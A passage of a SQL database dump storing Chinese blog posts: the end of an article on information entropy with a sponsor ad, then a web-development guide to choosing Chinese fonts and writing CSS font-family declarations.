)\n\n\n上面式子中最后的E，表示数学期望。可以理解成，每个符号所占用的二进制位，等于概率倒数的对数的数学期望。\n\n下面是一个例子。假定有两个文件都包含1024个符号，在ASCII码的情况下，它们的长度是相等的，都是1KB。甲文件的内容50%是a，30%b，20%是c，则平均每个符号要占用1.49个二进制位。\n\n\n  0.5*log2(1/0.5) + 0.3*log2(1/0.3) + 0.2*log2(1/0.2)\n\n= 1.49\n\n\n既然每个符号要占用1.49个二进制位，那么压缩1024个符号，理论上最少需要1526个二进制位，约0.186KB，相当于压缩掉了81%的体积。\n\n乙文件的内容10%是a，10%是b，......，10%是j，则平均每个符号要占用3.32个二进制位。\n\n\n  0.1*log2(1/0.1)*10\n\n= 3.32\n\n\n既然每个符号要占用3.32个二进制位，那么压缩1024个符号，理论上最少需要3400个二进制位，约0.415KB，相当于压缩掉了58%的体积。\n\n对比上面两个算式，可以看到文件内容越是分散（随机），所需要的二进制位就越长。所以，这个值可以用来衡量文件内容的随机性（又称不确定性）。这就叫做信息熵（information entropy）。\n\n它是1948年由美国数学家克劳德·香农（Claude Shannon）在经典论文《通信的数学理论》中，首先提出的。\n\n\n\n五、信息熵的含义\n\n想要理解信息熵这个概念，有几点需要注意。\n\n（1）信息熵只反映内容的随机性，与内容本身无关。不管是什么样内容的文件，只要服从同样的概率分布，就会计算得到同样的信息熵。\n\n（2）信息熵越大，表示占用的二进制位越长，因此就可以表达更多的符号。所以，人们有时也说，信息熵越大，表示信息量越大。不过，由于第一点的原因，这种说法很容易产生误导。较大的信息熵，只表示可能出现的符号较多，并不意味着你可以从中得到更多的信息。\n\n（3）信息熵与热力学的熵，基本无关。这两个熵不是同一件事，信息熵表示无序的信息，热力学的熵表示无序的能量（参见我写的《熵的社会学意义》）。\n\n（文章完）\n\n=====================================================\n\n\n\n以下为广告部分。欢迎大家在我的网络日志投放广告，推广自己的产品。今天介绍的是生命链记忆网。\n\n[赞助商广告]\n\n别人的终究是别人的，今天我们书写自己的传奇！个人史是汇入正史河流的涓涓细流。\n\n生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n花一分钟成为注册用户，就可以使用两大基本功能：生命链和生命之书。\n\n（1）生命链就是你的根，你可以邀请祖先(父系和母系)及子女合链，让自己的生命链有形化、可视化；所有血亲和姻亲成员之间可互动。\n\n\n\n（2）生命之书就是书写你的人生故事，包括日记、自传、随笔等等；自传可选择公开，在自传馆里能被所有人看到。\n\n\n\n生命链功能永久免费！\n\n生命之书功能每年付费10元，可使用100M空间（免费试用6个月）；累计付费1000元，生命之书永久开启。\n\n永恒之旅，从此开始，点击试用！\n\n（完）\n\n        文档信息\n\n版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）\n发表日期： 2014年9月 7日\n更多内容：  档案  » \n  理解计算机 \n\n付费支持： 购买文集\n社交媒体： twitter， weibo\nFeed订阅： \n\n        \n        [广告]　生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(17, 'http://www.ruanyifeng.com/blog/2014/07/chinese_fonts.html', '中文字体网页开发指南', '<p>字体的选择，是网页开发的关键因素之一。</p>\n\n        <p>合适的字体，对网页的美观度（或可读性）有着举足轻重的影响。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071502.jpg" title="" /></p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071503.jpg" title="" /></p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071504.gif" title="" /></p>\n\n<p>但是，相比<a href="http://www.ruanyifeng.com/blog/2008/06/typography_notes.html">英文字体</a>，中文字体的网页开发有着极大的局限性。因为，一套中文字体最少也要有几千个字符，体积为几个MB；单单为了浏览网页，开发者不可能让用户去下载字体，只能依靠操作系统的预装字体。（*注：确实有<a href="http://cn.justfont.com/">网站</a>提供中文字体的web服务，从技术角度，我不推荐这样做。）</p>\n\n<p>不同的操作系统、不同的版本预装不同的字体（因为版权），几乎没有交集。因此，大多数开发者索性忽略中文字体，让操作系统自行渲染，或者用图片呈现字体效果。</p>\n\n<p>下面是目前中文字体的最佳实践，主要参考了<a href="http://www.kendraschaefer.com/2012/06/chinese-standard-web-fonts-the-ultimate-guide-to-css-font-family-declarations-for-web-design-in-simplified-chinese/">Kendra Schaefer</a>的文章。</p>\n\n<h2>一、操作系统的预装字体</h2>\n\n<p>操作系统决定了开发者可以使用的字体。所以，第一步，我们必须了解操作系统到底提供哪些字体。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071513.jpg" title="" /></p>\n\n<p><strong>Windows操作系统</strong>：</p>\n\n<blockquote>\n  <ul>\n<li>黑体：SimHei</li>\n<li>宋体：SimSun</li>\n<li>新宋体：NSimSun</li>\n<li>仿宋：FangSong</li>\n<li>楷体：KaiTi</li>\n<li>仿宋<em>GB2312：FangSong</em>GB2312</li>\n<li>楷体<em>GB2312：KaiTi</em>GB2312</li>\n<li>微软雅黑：Microsoft YaHei （Windows 7开始提供）</li>\n</ul>\n</blockquote>\n\n<p><strong>OS X操作系统</strong>：</p>\n\n<blockquote>\n  <ul>\n<li>冬青黑体: Hiragino Sans GB （SNOW LEOPARD开始提供）</li>\n<li>华文细黑：STHeiti Light （又名STXihei）</li>\n<li>华文黑体：STHeiti</li>\n<li>华文楷体：STKaiti</li>\n<li>华文宋体：STSong</li>\n<li>华文仿宋：STFangsong</li>\n</ul>\n</blockquote>\n\n<p>如果用户装了<strong>MicroSoft Office</strong>，还会多出一些字体。</p>\n\n<blockquote>\n  <ul>\n<li>隶书：LiSu</li>\n<li>幼圆：YouYuan</li>\n<li>华文细黑：STXihei</li>\n<li>华文楷体：STKaiti</li>\n<li>华文宋体：STSong</li>\n<li>华文中宋：STZhongsong</li>\n<li>华文仿宋：STFangsong</li>\n<li>方正舒体：FZShuTi</li>\n<li>方正姚体：FZYaoti</li>\n<li>华文彩云：STCaiyun</li>\n<li>华文琥珀：STHupo</li>\n<li>华文隶书：STLiti</li>\n<li>华文行楷：STXingkai</li>\n<li>华文新魏：STXinwei</li>\n</ul>\n</blockquote>\n\n<h2>二、font-family命令</h2>\n\n<p>CSS的font-family命令，指定了网页元素所使用的字体。下面是一个例子。</p>\n\n<blockquote><pre><code class="language-css">\nfont-family: Georgia, "Times New Roman", \n             "Microsoft YaHei", "微软雅黑", \n             STXihei, "华文细黑", \n             serif;\n\n</code></pre></blockquote>\n\n<p>它的规则有三条。</p>\n\n<blockquote>\n  <p>（1）优先使用排在前面的字体。</p>\n\n<p>（2）如果找不到该种字体，或者该种字体不包括所要渲染的文字，则使用下一种字体。</p>\n\n<p>（3）如果所列出的字体，都无法满足需要，则让操作系统自行决定使用哪种字体。</p>\n</blockquote>\n\n<p><strong>根据这些规则，font-family应该优先指定英文字体，然后再指定中文字体。</strong>否则，中文字体所包含的英文字母，会取代英文字体，这往往很丑陋。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071507.jpg" title="" /></p>\n\n<p>上面图片中，红框内的英文字母，左边采用英文字体渲染，右边采用中文字体渲染，哪一种效果比较好，一目了然。</p>\n\n<p><strong>为了保证兼容性，中文字体的中文名称和英文名称，应该都写入font-family。</strong>比如，"微软雅黑"的英文名称是Microsoft YaHei。</p>\n\n<p>此外，中文字体的中文名称，以及由多个单词组成的英文名称，应该放在双引号内。</p>\n\n<h2>三、 Windows平台和Mac平台</h2>\n\n<p>由于Windows和Mac的中文字体没有交叉，所以应该同时为两个平台指定字体。</p>\n\n<p>常见的做法是，Windows平台指定"微软雅黑"（Microsoft YaHei），Mac平台指定"华文细黑"（STXihei）。 </p>\n\n<h2>四、衬线体和无衬线体</h2>\n\n<p>所谓"衬线体"（Serif），指的是笔画的末端带有衬线的字体。</p>\n\n<p>就像英文字体一样，中文字体也可以分成"衬线体"和"无衬线体"（San-serif）。比如，对于繁体字来说，微软正黑（Microsoft JhengHei）是无衬线体，新细明体（PMingLiU）是衬线体。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071506.png" title="" /></p>\n\n<p>对于简体字来说，微软雅黑（Microsoft yahei）是无衬线体，宋体（SimSun）是衬线体。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071508.png" title="" /></p>\n\n<p>一般来说，衬线体装饰性强，往往用于标题；无衬线体清晰度好，往往用于正文。</p>\n\n<h2>五、几种常见中文字体</h2>\n\n<p><strong>（1）宋体（SimSun）</strong></p>\n\n<p>宋体是最常见的中文字体，如果没有指定字体，操作系统往往选择它来渲染。很多人认为，这种字体并不美观。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071509.jpg" title="" /></p>\n\n<p><strong>（2）微软雅黑（Microsoft YaHei）</strong></p>\n\n<p>微软雅黑的美观度和清晰度都较好，可以作为网页的首选字体。它在Mac平台的对应字体是华文细黑（STXihei）。</p>\n\n<p>但是，Windows XP没有预装这种字体，这时可以选择黑体（Simhei）替代。不过，黑体比较粗，不应用于字号较小的文字。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071510.jpg" title="" /></p>\n\n<p><strong>（3）仿宋（FangSong）</strong></p>\n\n<p>这种字体是衬线体，比宋体的装饰性更强。如果字号太小，会影响清晰度，所以只有在字号大于14px的情况下，才可以考虑这种字体。</p>\n\n<p>它在Mac平台的对应字体是"华文仿宋"（STFangsong）。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071511.jpg" title="" /></p>\n\n<p><strong>（4）楷体（KaiTi）</strong></p>\n\n<p>楷体也是衬线体，装饰性与仿宋体接近，但是宽度更大，笔画更清楚一些。这种字体也不应该在小于14px的情况下使用。</p>\n\n<p>它在Mac平台的对应字体是"华文楷体"（STKaiti）。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014071512.jpg" title="" /></p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-07-15T08:43:59+08:00">2014年7月15日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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